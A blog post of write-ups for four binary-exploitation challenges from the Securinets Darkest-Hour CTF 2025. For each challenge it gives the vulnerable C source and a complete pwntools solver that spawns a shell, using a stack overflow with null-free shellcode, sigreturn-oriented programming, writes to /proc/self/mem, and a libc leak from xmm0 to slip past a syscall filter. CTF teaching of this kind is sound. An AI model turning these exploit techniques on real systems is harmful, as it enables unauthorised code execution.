---
layout: post
title: Securinets Darkest-Hour CTF 2025  | PWN writeups
description: challenges explained + solvers
tags: PWN shellcode SROP
---

# Warmup

```C
int main(){
    setup();
    printf("%p\n",__environ);
    char buf[0x50];
    char c;
    int i=0;

    while(1) {
        c=getchar();
        if (c==0 | c=='\n')
            break;
        buf[i++]=c;
        }
    return 0;
}
```

```bash
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

i thought it was a straight forward retshellcode with no null bytes . a stack leak was given with the `environ` leak . so i didnt even test it prior the ctf xD . After some time i realised that when overflowing the stack , we're bound to overwrite the 'i' counter variable , i liked the idea so i kept it .

Plan :

- write an execve('/bin/sh',0,0) shellcode with no null bytes . we can accomplish with avoiding instructions like `mov rsi,0` with `xor rsi,rsi` . the nullbyte of '/bin/sh' string will be replaced with an 'a' in our input but will be xor'ed with an 'a' using our shellcode so we can null it out and we get a prope '/bin/sh'
- overflow into the counter variable and we write the return address offset which is 0x68 . se next time , `i=0x68`
- now we are at the return address , we simply write our buffer address which we calculate from the `environ leak`
- GG

Solver :

```python
from pwn import *

context.arch='amd64'

file=ELF("main")
p=process("./main")

buf=int(p.recvline(),16)-0x188
log.info(hex(buf))
shellcode=asm('''
            xor rsi,rsi
            xor rdx,rdx
            mov al,0x3b
            lea rdi,[rsp-0x70+0x47]
            xor BYTE PTR [rdi],0x61
            lea rdi,[rsp-0x70+0x40]
            syscall
              ''').ljust(0x40,b"c")+b"/bin/sha"  # the xor line replaces the 'a' in /bin/sha iwith null byte as we are not allowed to write it

p.send(shellcode.ljust(92,b"a"))
p.send(p8(0x68))   # this goes into the counter so next time we write , we write at offset 0x68 which is the offset of return address
p.sendline(p64(buf))
p.interactive()
```

---

# SuperRapperOPeration

tldr : srop challenge , syscall gadget was given , no other useful gadget tho

you can read about the technique [here](https://sharkmoos.medium.com/a-quick-demonstration-of-sigreturn-oriented-programming-d9ae98c3ab0e)

```C
int main(){
    setup();
    alarm(60);
    char buff[0x100];
    read(0,buff,0x110);
    return 0;
}
```

```bash
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Recon :

- Pie disabled : means we can pivot stack to BSS
- no libc given , challenge hints on SROP so thats mostly the plan
- no `pop rax` or any rax related and useful gadget so we have to somehow control rax .

Plan (the intended way) :

- the intended way to control rax was to use the `alarm` function right when there is 0xf (which is the sigreturn sytem call number) seconds left in the alarm . read about its return value here [link](https://man7.org/linux/man-pages/man2/alarm.2.html#RETURN_VALUE)
- we do some pivoting so we can set up the sigreturn frame and write "/bin/sh" at a known location in BSS
- we pivot then return to our ropchain that looks like this : alarm + syscall + sigframe
- concering the sigframe , we can ignore a l large number of useless registers as they dont concern us .

Solver :

```
from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* 0x0000000000401179
                           c
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
nc="nc localhost 5000"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############

main=exe.symbols["main"]
#debug()
rbp=0x0000000000404000+0xe00
p.send(b"a"*0x100+p64(rbp)+p64(main+31))
sleep(0.5)
alarm=0x0000000000401040
leave=0x00000000004011bb
syscall=0x0000000000401179

frame = SigreturnFrame()
frame.rax=0x3b
frame.rdi=0x404d78
frame.rsi=0
frame.rdx=0
frame.rip=syscall
frame.r15=u64("/bin/sh\x00")
#print(frame)
#print(len(frame))
_rop=p64(alarm)+p64(syscall)+bytes(frame)[:0xe8]
sleep(60-0xf-1)  # tried and it works ; the -1 for remote
p.send(p64(rbp)+_rop.ljust(0xf8,p8(0))+p64(rbp-0x100)+p64(leave))
p.interactive()
```

---

# write_syndrom

```C
int main(){
    setup();
    char file_path[0x40]={0};
    puts("give file name");
    fgets(file_path,sizeof(file_path),stdin);
    long b=strcspn(file_path,"\n");
    file_path[b]=0;

    if (access(file_path, W_OK) == 0) {

        int fd =open(file_path,O_WRONLY);
        if (fd<=0){
            puts("[-] couldnt open file for some reason");
            exit(-1);
        }
        unsigned long position=0;
        puts("now give position where to write");
        scanf("%llu%*c",&position);
        if (lseek(fd,position,SEEK_SET)<0){
            puts("[-] lseek failed for some reason");
            exit(-1);
        }
        printf("you will write up to 16 bytes at the postion %x\nnow give your payload\n",position);
        char payload[16]={0};
        if (write(fd,payload,read(0,payload,16))<=0) {
            puts("[-] write() error");
            exit(-1);
        }
        close(fd);
        return 0;
    }
    else{
        puts("[-] file doesnt exist or isnt writable");
        exit(-1);

    }

    return 0;
}
```

tldr : you can open any file you want and write 16 bytes to it . RCE needed

in the midst of the ctf , i gave a hint about proc files . reading this [proc fs](https://docs.kernel.org/filesystems/proc.html) , we notice an interesting file _mem_ : Memory held by this process . looking further into this specific file, we find this [link](https://blog.cloudflare.com/diving-into-proc-pid-mem/#what-does-proc-pid-mem-do), it shows that we can read and write to this file , and it will be just like writing to the memory of the process , one thing more interesting about it is that we can write in non writeable memory .

Plan :

- open '/proc/self/mem' , overwrite some code of main , typically the one right after _write_ with a shellcode of our own .
- we only have 16 bytes shellcode , so we need to write the string /bin/sh beforehand , the intended way was to write it right after the prompted filename , seperated by null byte .
- try to write a very minimalistic shellcode so it fits into 16 bytes

Solver :

```python
from pwn import *

context.arch='amd64'
#p=process("./chal")
p=remote("localhost",7004)
p.sendline(b"/proc/self/mem\x00"+b"/bin/sh\x00")

p.sendline(str(0x00000000004013c5).encode())

shellcode='''
    lea rdi, [rsp+0x2f]
    xor esi,esi
    xor edx,edx
    mov eax,0x3b
    syscall
'''
p.send(asm(shellcode))

p.interactive()
```

---

# DHlam

```C
char shellcode[]="H1\xc0H1\xdbH1\xc9H1\xd2H1\xe4H1\xedH1\xf6H1\xffM1\xc0M1\xc9M1\xd2M1\xdbM1\xe4M1\xedM1\xf6M1\xff";
int sanitize(char * code){
    for (int i=0;i<0x500;i++){

        if (memcmp(code+i,"\x0f\x05",2)==0) return 0;
        if (memcmp(code+i,"\xcd\x80",2)==0) return 0;
        if (memcmp(code+i,"\x0f4",2)==0) return 0;
    }
    return 1;
}
void setup(){
    setbuf(stdin,0);
    setbuf(stdout,0);

}
int main(){

    setup();
    puts("dahdes fel dhalma !!");

    char * code=mmap((void*)0x13371337,0x1000,7,MAP_ANONYMOUS|MAP_PRIVATE,-1,0);
    memcpy(code,shellcode,sizeof(shellcode));

    read(0,(char*)code+sizeof(shellcode)-1,0x100);

    if (!sanitize(code+sizeof(shellcode)-1)){
        puts("rabi yehdi !!");
        exit(-1);
    }

    mprotect(code,0x1000,PROT_READ|PROT_EXEC);


    if (arch_prctl(0x1002, 0) != 0) {
        perror("Failed to clear FS");
    }
    ((void (*)()) code) ();

    return 0;
}

```

```bash
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
```

tldr : read shellcode place it in r-x memory then execute it .

Notes :

- before executing the user shellcode , it nulls out all registers (or did I , xd)
- our shellcode is filtered from these instructions : syscall - sysenter , int 0x80 which are the backbone of any code execution .
- even fs register is cleared (usually fs points somewhere in tls which can lead to libc ) , gs registered is nulled out by default .
- our shellcode is in r-x region , so it cant mutate and overwrite itself as memory isnt rightable

Solution :

- use one of the 128 bits register to try and find any leak so we can eventually get to libc .
- the one i tested out was xmm0 which had libc value in its lower 64 bits .
- now that we have libc we calculate libc base then set rdi to '/bin/sh' pointer then jump to a syscall gadget in libc (you can also jump to system)
- GG

Solver :

```python
from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
        if local<2:
                gdb.attach(p,'''
                        b* main+290
                        c
                        ''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./main")
libc=ELF("./libc.so.6")
nc="nc localhost 7000"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
        p=remote(host,port)
else:
        p=process([exe.path])

############### helper functions ##############
def send():
        pass

############### main exploit    ###############

binsh=next(libc.search("/bin/sh"))
system=libc.symbols["system"]
syscall=0x00000000000264a3
shellcode=f'''
        movq rbx,xmm0
        sub rbx,0x1d7643
        mov rdi , rbx
        add rdi , {binsh}

        mov rcx ,rbx
        add rcx, {syscall}
        xor rsi,rsi
        xor rdx,rdx
        mov rax,0x3b
        jmp rcx

'''

shellcode=asm(shellcode)
#debug()
p.sendline(shellcode)

p.interactive()
```
